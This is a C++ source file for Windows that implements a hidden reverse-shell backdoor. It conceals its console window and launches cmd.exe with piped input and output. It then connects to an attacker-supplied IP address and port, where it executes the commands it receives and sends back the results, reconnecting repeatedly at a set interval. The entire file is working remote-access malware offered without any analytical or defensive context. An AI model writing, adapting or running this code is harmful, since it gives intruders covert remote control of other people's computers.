
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <winsock2.h>
#include <BaseTsd.h>
#include <Windows.h>
#include <string>
#include <ws2tcpip.h>
typedef SSIZE_T ssize_t;

char * server_ip;
int server_port;
int interval;

SOCKET m_socket;

static const int BUFFER_SIZE = 16 * 1024;
#define BUFSIZE 4096

using std::string;

HANDLE g_hChildStd_OUT_Rd = NULL;
HANDLE g_hChildStd_OUT_Wr = NULL;
HANDLE g_hChildStd_IN_Rd = NULL;
HANDLE g_hChildStd_IN_Wr = NULL;

void WriteToPipe(string msg);
char* ReadFromPipe(void);

int mainLoop() {
	WSADATA wsaData;
	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != NO_ERROR)
		return 1;
	// Create a socket.
	m_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	sockaddr_in clientService;
	clientService.sin_family = AF_INET;
	// Just test using the localhost, you can try other IP address
	clientService.sin_addr.s_addr = inet_addr(server_ip);
	clientService.sin_port = htons(server_port);
	if (connect(m_socket, (SOCKADDR*)&clientService, sizeof(clientService)) == SOCKET_ERROR) {
		return 1;
	}

	// Send and receive data.
	int bytesSent;
	int bytesRecv = SOCKET_ERROR;
	// Be careful with the array bound, provide some checking mechanism...
	char sendbuf[16000] = "";
	char recvbuf[16000] = "";
	char inFromPipe[16000] = "";
	int inLen = 0;
	int prevLen = 0;
	// Receives some test string to server...
	while (true)
	{
		strcpy(sendbuf, ReadFromPipe());
		bytesSent = send(m_socket, sendbuf, strlen(sendbuf), 0);

		bytesRecv = recv(m_socket, recvbuf, 16000, 0);
		if (bytesRecv == 0 || bytesRecv == WSAECONNRESET)
		{
			break;
		}
		if (bytesRecv < 0)
			return 0;
		else {
			WriteToPipe(recvbuf);
		}

	}
	WSACleanup();
	return 0;
}

int main(int argc, char ** argv){
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	server_ip = argv[1];
	server_port = atoi(argv[2]);
	interval = atoi(argv[3]);
	
	//BEFORE sending/recieving, open a command line session and redirect its I/O to our pipes
	SECURITY_ATTRIBUTES saAttr;

	// Set the bInheritHandle flag so pipe handles are inherited.
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;

	// Create pipes for the child process's STDOUT and STDIN,
	// ensures both handle are not inherited
	CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0);
	SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0);

	CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0);
	SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0);

	
	// CREATE CHILD PROCESS

	TCHAR szCmdline[] = TEXT("cmd.exe");
	STARTUPINFO siStartInfo;
	PROCESS_INFORMATION piProcInfo;

	// Set up members of the PROCESS_INFORMATION structure.
	ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));

	// Set up members of the STARTUPINFO structure.
	// This structure specifies the STDIN and STDOUT handles for redirection.
	ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
	siStartInfo.cb = sizeof(STARTUPINFO);
	siStartInfo.hStdError = g_hChildStd_OUT_Wr;
	siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
	siStartInfo.hStdInput = g_hChildStd_IN_Rd;
	siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

	CreateProcess(NULL, szCmdline, NULL, NULL, TRUE, 0,
		NULL, NULL, &siStartInfo, &piProcInfo);

	// Close handles to the child process and its primary thread.
	// Some applications might keep these handles to monitor the status
	// of the child process, for example. 
	CloseHandle(g_hChildStd_OUT_Wr);
	CloseHandle(g_hChildStd_IN_Rd);
	CloseHandle(piProcInfo.hProcess);
	CloseHandle(piProcInfo.hThread);
	
	//Done opening command line session
	while (1) {
		mainLoop();
		Sleep(interval);
	}
}

void WriteToPipe(string msg)
{
	WriteFile(g_hChildStd_IN_Wr, msg.c_str(), msg.size(), NULL, NULL);
}

char* ReadFromPipe(void)
{
	DWORD total = 0;
	DWORD dwRead, dwWritten;
	CHAR chBuf[BUFSIZE];
	BOOL bSuccess = FALSE;
	HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
	CHAR oldChBuf[BUFSIZE] = "";
	for (;;)
	{
		PeekNamedPipe(g_hChildStd_OUT_Rd, chBuf, BUFSIZE, &dwRead, NULL, NULL);
		if (strcmp(chBuf, oldChBuf) == 0) break;
		total += dwRead;
		Sleep(250);
		strcpy(oldChBuf, chBuf);
	}
	chBuf[total] = 0;
	return chBuf;
}